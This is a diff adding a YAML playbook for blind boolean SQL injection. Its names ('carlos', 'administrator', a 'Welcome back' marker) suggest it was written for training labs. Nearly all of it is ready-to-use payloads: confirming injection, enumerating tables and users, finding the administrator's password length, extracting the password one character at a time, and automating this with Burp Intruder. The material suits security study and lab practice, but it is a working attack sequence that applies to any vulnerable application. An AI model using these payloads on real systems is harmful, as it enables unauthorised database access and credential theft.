@@ -1,0 +1,277 @@
+name: Blind Boolean SQLi
+
+steps:
+
+# =========================================================
+# [1] BOOLEAN CONFIRMATION
+# =========================================================
+- title: Boolean Confirmation
+  mode: chain
+  info: |
+    Confirm that boolean conditions affect the response.
+
+  entries:
+
+    - cmd: "' AND '1'='1"
+      info: always true
+
+    - cmd: "' AND '1'='2"
+      info: always false
+
+    - cmd: "' OR 1=1--"
+      info: true condition
+
+    - cmd: "' OR 1=2--"
+      info: false condition
+
+  look_for:
+    - welcome back message
+    - response length changes
+    - redirect differences
+    - status code changes
+    - visible content differences
+
+  notes:
+    - compare TRUE vs FALSE responses
+    - differences confirm blind injection
+    - works in:
+      - cookies
+      - GET params
+      - POST params
+      - headers
+
+
+# =========================================================
+# [2] QUERY EXECUTION
+# =========================================================
+- title: Confirm Query Execution
+  mode: chain
+  info: |
+    Verify injected queries execute successfully.
+
+  entries:
+
+    - cmd: "' AND (SELECT 'a')='a"
+      info: simple query
+
+    - cmd: "' AND (SELECT 'a' FROM users LIMIT 1)='a"
+      info: verify users table
+
+    - cmd: "' AND (SELECT 'a' FROM users WHERE username='administrator')='a"
+      info: verify administrator user
+
+  look_for:
+    - TRUE response behavior
+    - successful query execution
+
+  notes:
+    - confirms:
+      - table existence
+      - row existence
+      - query execution
+
+
+# =========================================================
+# [3] TABLE ENUMERATION
+# =========================================================
+- title: Table Enumeration
+  mode: enum
+  info: |
+    Infer table existence using boolean conditions.
+
+  entries:
+
+    - cmd: "' AND (SELECT 'a' FROM users LIMIT 1)='a"
+      info: users table exists
+
+    - cmd: "' AND (SELECT 'a' FROM accounts LIMIT 1)='a"
+      info: accounts table exists
+
+    - cmd: "' AND EXISTS(SELECT * FROM users)"
+      info: EXISTS check
+
+  look_for:
+    - response changes
+    - TRUE conditions
+
+  notes:
+    - useful when schema names are guessed
+    - blind enumeration is slower than UNION SQLi
+
+
+# =========================================================
+# [4] USER ENUMERATION
+# =========================================================
+- title: User Enumeration
+  mode: enum
+  info: |
+    Confirm usernames exist.
+
+  entries:
+
+    - cmd: "' AND (SELECT 'a' FROM users WHERE username='administrator')='a"
+      info: administrator exists
+
+    - cmd: "' AND (SELECT 'a' FROM users WHERE username='admin')='a"
+      info: admin exists
+
+    - cmd: "' AND EXISTS(SELECT * FROM users WHERE username='carlos')"
+      info: generic existence check
+
+  look_for:
+    - TRUE response behavior
+    - reflected application changes
+
+  notes:
+    - useful for:
+      - admin discovery
+      - valid usernames
+      - account enumeration
+
+
+# =========================================================
+# [5] PASSWORD LENGTH
+# =========================================================
+- title: Password Length Extraction
+  mode: chain
+  info: |
+    Determine password length using boolean conditions.
+
+  entries:
+
+    - cmd: "' AND LENGTH(password)>1--"
+      info: length greater than 1
+
+    - cmd: "' AND LENGTH(password)>5--"
+      info: length greater than 5
+
+    - cmd: "' AND LENGTH(password)>10--"
+      info: length greater than 10
+
+    - cmd: "' AND LENGTH(password)=20--"
+      info: exact length
+
+    - cmd: "' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')>20--"
+      info: targeted extraction
+
+  look_for:
+    - response changes
+    - TRUE vs FALSE behavior
+
+  notes:
+    - increment until response changes
+    - binary search can speed up extraction
+
+
+# =========================================================
+# [6] CHARACTER EXTRACTION
+# =========================================================
+- title: Character Extraction
+  mode: chain
+  info: |
+    Extract password characters one at a time.
+
+  entries:
+
+    - cmd: "' AND SUBSTRING(password,1,1)='a'--"
+      info: first character
+
+    - cmd: "' AND SUBSTRING(password,2,1)='b'--"
+      info: second character
+
+    - cmd: "' AND SUBSTRING(password,3,1)='c'--"
+      info: third character
+
+    - cmd: "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--"
+      info: targeted extraction
+
+  look_for:
+    - TRUE response behavior
+    - successful character match
+
+  notes:
+    - iterate through:
+      - a-z
+      - A-Z
+      - 0-9
+      - symbols
+    - repeat for every character position
+
+
+# =========================================================
+# [7] BURP INTRUDER AUTOMATION
+# =========================================================
+- title: Burp Intruder Automation
+  mode: chain
+  info: |
+    Automate blind extraction using Burp Intruder.
+
+  entries:
+
+    - cmd: "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§"
+      info: payload marker
+
+    - cmd: "Payloads: a-z + 0-9"
+      info: brute-force charset
+
+    - cmd: "Grep Match: Welcome back"
+      info: detect TRUE condition
+
+    - cmd: "Change SUBSTRING offset"
+      info: iterate character positions
+
+  look_for:
+    - grep matches
+    - successful payloads
+    - differing response lengths
+
+  notes:
+    - payload markers:
+      - §payload§
+    - grep for:
+      - welcome back
+      - redirects
+      - response size
+    - automate extraction character-by-character
+
+
+# =========================================================
+# [8] FULL BOOLEAN WORKFLOW
+# =========================================================
+- title: Example Blind Boolean Workflow
+  mode: chain
+  info: |
+    Full workflow for blind boolean SQL injection.
+
+  entries:
+
+    - cmd: "' AND '1'='1"
+      info: verify TRUE condition
+
+    - cmd: "' AND '1'='2"
+      info: verify FALSE condition
+
+    - cmd: "' AND (SELECT 'a' FROM <TABLE> LIMIT 1)='a"
+      info: verify table exists
+
+    - cmd: "' AND (SELECT 'a' FROM <TABLE> WHERE username='administrator')='a"
+      info: verify user exists
+
+    - cmd: "' AND (SELECT LENGTH(password) FROM <TABLE> WHERE username='administrator')>10--"
+      info: determine password length
+
+    - cmd: "' AND (SELECT SUBSTRING(password,1,1) FROM <TABLE> WHERE username='administrator')='a'--"
+      info: extract characters
+
+    - cmd: "Use Burp Intruder for automation"
+      info: automate extraction
+
+  look_for:
+    - response differences
+    - TRUE/FALSE behavior
+    - reflected application changes
+
+  notes:
+    - blind SQLi relies entirely on inference
+    - compare responses carefully
+    - automate extraction whenever possible
